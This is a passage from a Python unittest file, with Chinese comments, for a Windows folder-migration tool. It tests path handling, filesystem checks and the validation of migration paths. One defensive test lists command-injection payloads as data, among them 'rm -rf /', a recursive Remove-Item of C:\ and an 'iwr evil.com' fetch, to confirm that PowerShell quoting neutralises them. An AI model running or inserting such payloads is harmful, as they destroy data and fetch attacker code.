        self.assertEqual(_with_long_path_prefix(None), None)

    def test_forward_slash_normalized_to_backslash(self):
        """正斜杠输入加前缀后统一为反斜杠分隔符（避免混合分隔符）"""
        from migrate_engine import _with_long_path_prefix
        r = _with_long_path_prefix("C:/Users/testuser")
        self.assertTrue(r.startswith("\\\\?\\C:\\"), f"应统一反斜杠: {repr(r)}")
        self.assertNotIn("/", r[4:], "前缀后不应残留正斜杠")


class TestCloudPlaceholder(unittest.TestCase):
    """4.2 云同步占位符检测：普通目录不误报、边界安全"""

    def setUp(self):
        self._tmp = tempfile.mkdtemp(prefix="test_placeholder_")

    def tearDown(self):
        base = os.path.basename(self._tmp)
        if base.startswith("test_placeholder_"):
            shutil.rmtree(self._tmp, ignore_errors=True)

    def test_normal_dir_returns_zero(self):
        """普通目录（无云占位符）应返回 0，不误报"""
        from utils import count_cloud_placeholder_files
        for sub in ("a", "b"):
            os.makedirs(os.path.join(self._tmp, sub))
        with open(os.path.join(self._tmp, "a", "f1.txt"), "w") as f:
            f.write("x")
        count, example = count_cloud_placeholder_files(self._tmp)
        self.assertEqual(count, 0)
        self.assertEqual(example, "")

    def test_empty_and_missing(self):
        """空目录/不存在路径：返回 0 不崩溃"""
        from utils import count_cloud_placeholder_files
        self.assertEqual(count_cloud_placeholder_files(self._tmp), (0, ""))
        self.assertEqual(count_cloud_placeholder_files(
            os.path.join(self._tmp, "not_exist")), (0, ""))


class TestTargetFsType(unittest.TestCase):
    """4.3 目标盘文件系统类型检测（非 NTFS 警告）"""

    def test_real_drives_no_crash(self):
        """真实盘检测：结构正确、不崩溃（本机 NTFS 应为 ok）"""
        import env_check
        for d in ("C:", "D:", "E:"):
            if os.path.exists(d):
                name, status, detail = env_check.check_target_drive(d)
                self.assertEqual(name, "目标盘")
                self.assertIn(status, ("ok", "warn"))
                self.assertTrue(detail)

    def test_fat32_warns(self):
        """FAT32 目标盘应给出明确警告（含 4GB 限制提示）"""
        import ctypes
        import env_check

        def fake_get_vol(root, vol, volsz, ser, maxcomp, flags, fs, fssz):
            fs.value = "FAT32"
            return True

        with patch.object(ctypes.windll.kernel32, "GetVolumeInformationW",
                          side_effect=fake_get_vol):
            name, status, detail = env_check.check_target_drive("C:")
        self.assertEqual(status, "warn", "FAT32 应警告")
        self.assertIn("FAT32", detail)
        self.assertIn("4GB", detail)


class TestSystemPathRefine(unittest.TestCase):
    """is_system_path 收窄：用户级缓存/模拟目录不再误标 [系统]"""

    def test_user_cache_no_longer_system(self):
        """AppData\\Local\\Microsoft\\Windows（INetCache 等用户级缓存）迁走无害"""
        import os
        from utils import is_system_path
        la = os.environ.get("LOCALAPPDATA", "")
        self.assertTrue(la, "测试依赖 LOCALAPPDATA 环境变量")
        p = os.path.join(la, "Microsoft", "Windows", "INetCache")
        self.assertFalse(is_system_path(p), "用户级缓存不应标 [系统]")

    def test_wine_simulated_system32_not_system(self):
        """用户目录下的模拟 system32（如 .wine）不应误标"""
        import os
        from utils import is_system_path
        up = os.environ.get("USERPROFILE", "")
        self.assertTrue(up)
        self.assertFalse(is_system_path(
            os.path.join(up, ".wine", "drive_c", "windows", "system32")))
        self.assertFalse(is_system_path(
            os.path.join(up, "AppData", "Local", "SomeApp", "drivers")))

    def test_real_system_still_protected(self):
        """真系统位置仍标 [系统]（监控目录范围内）"""
        from utils import is_system_path
        self.assertTrue(is_system_path(r"C:\ProgramData\Microsoft\Windows Defender"))
        self.assertTrue(is_system_path(r"C:\Program Files\WindowsApps"))
        self.assertTrue(is_system_path(r"C:\ProgramData\Microsoft\Windows"))
        self.assertTrue(is_system_path(r"C:\Program Files\Microsoft\Edge"))


class TestMigrationPathValidation(unittest.TestCase):
    """H1 行为测试：迁移路径校验（src==dst / 包含关系）——真正调用函数而非源码哨兵"""

    def test_same_path_rejected(self):
        from migrator import _validate_migration_paths
        ok, err = _validate_migration_paths(r"D:\data", r"D:\data")
        self.assertFalse(ok)
        self.assertIn("相同", err)

    def test_src_inside_dst_rejected(self):
        from migrator import _validate_migration_paths
        ok, err = _validate_migration_paths(r"D:\data\x", r"D:\data")
        self.assertFalse(ok)
        self.assertIn("包含关系", err)

    def test_dst_inside_src_rejected(self):
        from migrator import _validate_migration_paths
        ok, err = _validate_migration_paths(r"D:\data", r"D:\data\x")
        self.assertFalse(ok)
        self.assertIn("包含关系", err)

    def test_drive_root_dst_rejected(self):
        """盘符根作为目标（D:\data → D:\）必须拒绝"""
        from migrator import _validate_migration_paths
        ok, err = _validate_migration_paths(r"D:\data", "D:\\")
        self.assertFalse(ok)
        self.assertIn("包含关系", err)

    def test_different_drives_ok(self):
        from migrator import _validate_migration_paths
        ok, err = _validate_migration_paths(r"C:\data", r"D:\backup")
        self.assertTrue(ok, err)

    def test_sibling_dirs_ok(self):
        from migrator import _validate_migration_paths
        ok, err = _validate_migration_paths(r"D:\a", r"D:\b")
        self.assertTrue(ok, err)

    def test_dotdot_traversal_rejected(self):
        """路径穿越（..\\）应被 normpath 归一化后识别为包含关系"""
        from migrator import _validate_migration_paths
        ok, err = _validate_migration_paths(r"D:\data\sub", r"D:\data\..\data")
        # normpath 后 D:\data\..\data == D:\data，等于 src → 拒绝
        self.assertFalse(ok)


class TestPsQuoteBehavior(unittest.TestCase):
    """H3 行为测试：PowerShell 单引号转义（防注入）——真正调用 _ps_quote"""

    def test_single_quote_doubled(self):
        from migrator import _ps_quote
        self.assertEqual(_ps_quote("a'b"), "a''b")
        self.assertEqual(_ps_quote("'"), "''")

    def test_injection_syntax_preserved_safely(self):
        """注入语法在单引号字符串内是字面量：转义后无闭合引号可逃逸"""
        from migrator import _ps_quote
        payloads = ["';rm -rf /;'", "$(Remove-Item -Recurse C:\\)",
                    "x'; iwr evil.com; '", "a&b|c^d"]
        for p in payloads:
            q = _ps_quote(p)
            # 单引号字符串内所有 ' 已双写 → 无未配对的引号可闭合
            self.assertEqual(q.count("'") % 2, 0,
                             f"注入载荷转义后引号应成对: {p!r} -> {q!r}")
            self.assertNotIn("'", q.replace("''", ""),
                             f"除双写外不应残留裸单引号: {p!r}")

    def test_empty_and_none(self):
        from migrator import _ps_quote
        self.assertEqual(_ps_quote(""), "")
        self.assertEqual(_ps_quote(None), "None")


if __name__ == "__main__":
    unittest.main(verbosity=2)
